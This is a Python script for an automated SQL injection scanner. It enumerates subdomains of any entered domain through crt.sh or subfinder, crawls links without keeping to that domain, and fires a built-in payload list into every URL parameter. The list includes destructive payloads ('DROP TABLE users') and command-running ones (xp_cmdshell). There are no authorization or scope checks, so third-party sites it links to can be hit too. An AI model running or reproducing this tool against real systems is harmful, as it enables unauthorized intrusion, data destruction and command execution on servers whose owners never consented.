import requests
from bs4 import BeautifulSoup
import tldextract
import subprocess
import threading
import queue

# Function to fetch subdomains using crt.sh with fallback to subfinder
def get_subdomains(domain):
    subdomains = []
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            for entry in data:
                subdomain = entry['name_value'].split('\n')
                for sub in subdomain:
                    if sub not in subdomains:
                        subdomains.append(sub)
        else:
            raise Exception("crt.sh API failed")
    except Exception as e:
        print(f"crt.sh failed: {e}. Falling back to subfinder.")
        # Fallback to subfinder
        result = subprocess.run(['subfinder', '-d', domain, '-silent'], stdout=subprocess.PIPE)
        subdomains = result.stdout.decode('utf-8').splitlines()
    return subdomains

# Function to crawl URLs from a given page
def crawl_url(url, crawled_urls, url_queue):
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        for link in soup.find_all('a'):
            href = link.get('href')
            if href and href.startswith('http') and href not in crawled_urls:
                crawled_urls.add(href)
                url_queue.put(href)
    except requests.RequestException as e:
        print(f"Error crawling {url}: {e}")

# Function to extract parameters from a URL
def extract_params(url):
    parsed_url = requests.utils.urlparse(url)
    query_params = requests.utils.parse_qs(parsed_url.query)
    return query_params

# Function to get SQL injection payloads
def get_payloads():
    return [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1'/*",
        "' OR '1'='1' #",
        "' OR '1'='2",
        "' OR 'x'='x",
        "' OR 'x'='y",
        "' AND '1'='1",
        "' AND '1'='1' --",
        "' AND '1'='1'/*",
        "' AND '1'='1' #",
        "' AND '1'='2",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT null,null,null--",
        "' OR 'a'='a",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "1' ORDER BY 4--",
        "'; EXEC sp_executesql N'SELECT @@version'",
        "'; EXEC xp_cmdshell('whoami')",
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 1=1#",
        "' AND 1=2#",
        "' AND 1=1/*",
        "' AND 1=2/*",
        "') AND 1=1--",
        "') AND 1=2--",
        "') AND 1=1#",
        "') AND 1=2#",
        "') AND 1=1/*",
        "') AND 1=2/*",
        "' OR 1=1--",
        "' OR 1=2--",
        "' OR 1=1#",
        "' OR 1=2#",
        "' OR 1=1/*",
        "' OR 1=2/*",
        "admin'--",
        "admin'/*",
        "admin'--",
        "admin'/*",
        "admin' #",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
        "1; DROP TABLE users--",
        "1; DROP TABLE students--",
    ]

# Function to test a URL for SQL injection vulnerabilities
def test_sql_injection(url, params, payloads):
    for param in params:
        for payload in payloads:
            test_params = params.copy()
            test_params[param] = payload
            try:
                response = requests.get(url, params=test_params, timeout=10)
                if "syntax error" in response.text.lower() or "mysql" in response.text.lower() or "you have an error in your sql syntax" in response.text.lower():
                    print(f"Vulnerable: {url} with payload: {payload}")
                    return True
            except requests.RequestException as e:
                print(f"Error testing {url}: {e}")
    return False

# Main function to run the tool
def main(domain):
    # Ensure the domain does not include the scheme
    if domain.startswith("http://") or domain.startswith("https://"):
        domain = domain.split("//")[1]

    # Get subdomains
    subdomains = get_subdomains(domain)
    if not subdomains:
        print(f"No subdomains found for domain {domain}")
        return

    # Crawl URLs
    crawled_urls = set()
    url_queue = queue.Queue()
    all_urls = []

    for subdomain in subdomains:
        url = f"http://{subdomain}"
        if url not in crawled_urls:
            crawled_urls.add(url)
            url_queue.put(url)

    while not url_queue.empty():
        url = url_queue.get()
        all_urls.append(url)
        crawl_url(url, crawled_urls, url_queue)

    # Test for SQL injection
    payloads = get_payloads()
    for url in all_urls:
        params = extract_params(url)
        if params:
            if test_sql_injection(url, params, payloads):
                print(f"Vulnerable URL found: {url}")

if __name__ == "__main__":
    domain = input("Enter the domain to scan: ")
    main(domain)
